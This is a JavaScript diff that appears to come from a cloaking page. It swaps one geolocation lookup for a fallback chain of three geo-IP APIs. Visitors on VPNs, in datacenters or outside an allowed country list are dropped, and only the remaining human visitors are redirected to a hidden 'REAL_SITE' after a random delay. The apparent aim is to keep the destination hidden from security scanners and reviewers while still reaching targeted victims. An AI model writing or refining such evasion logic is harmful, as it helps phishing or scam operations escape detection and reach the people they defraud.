@@ -553,14 +553,31 @@ const ALLOWED_COUNTRIES = ['GB', 'US', 'CA', 'AU', 'NZ'];
   });
   if (!human) return;
 
-  try {
-    const r   = await fetch('http://ip-api.com/json/?fields=status,countryCode,proxy,hosting',
-                  { signal: AbortSignal.timeout(5000) });
-    const geo = await r.json();
-    if (!geo || geo.status !== 'success')             return;
-    if (geo.proxy || geo.hosting)                     return;
-    if (!ALLOWED_COUNTRIES.includes(geo.countryCode)) return;
-  } catch { return; }
+  // Try multiple HTTPS geo APIs — fallback chain so one failure doesn't block real users
+  let passed = false;
+  const geoApis = [
+    () => fetch('https://freeipapi.com/api/json', { signal: AbortSignal.timeout(5000) })
+            .then(r => r.json())
+            .then(d => ({ ok: !!d.countryCode, cc: d.countryCode, proxy: false, hosting: false })),
+    () => fetch('https://ipwho.is/', { signal: AbortSignal.timeout(5000) })
+            .then(r => r.json())
+            .then(d => ({ ok: d.success, cc: d.country_code, proxy: d.type === 'hosting', hosting: d.type === 'hosting' })),
+    () => fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(5000) })
+            .then(r => r.json())
+            .then(d => ({ ok: !d.error, cc: d.country_code, proxy: false, hosting: false })),
+  ];
+
+  for (const call of geoApis) {
+    try {
+      const d = await call();
+      if (!d.ok || !d.cc) continue;
+      if (d.proxy || d.hosting)                     return; // VPN / datacenter
+      if (!ALLOWED_COUNTRIES.includes(d.cc))        return; // wrong country
+      passed = true;
+      break;
+    } catch { continue; } // this API failed, try next
+  }
+  if (!passed) return; // all APIs failed — stay safe
 
   await new Promise(r => setTimeout(r, 100 + Math.random() * 400));
   window.location.replace(REAL_SITE);
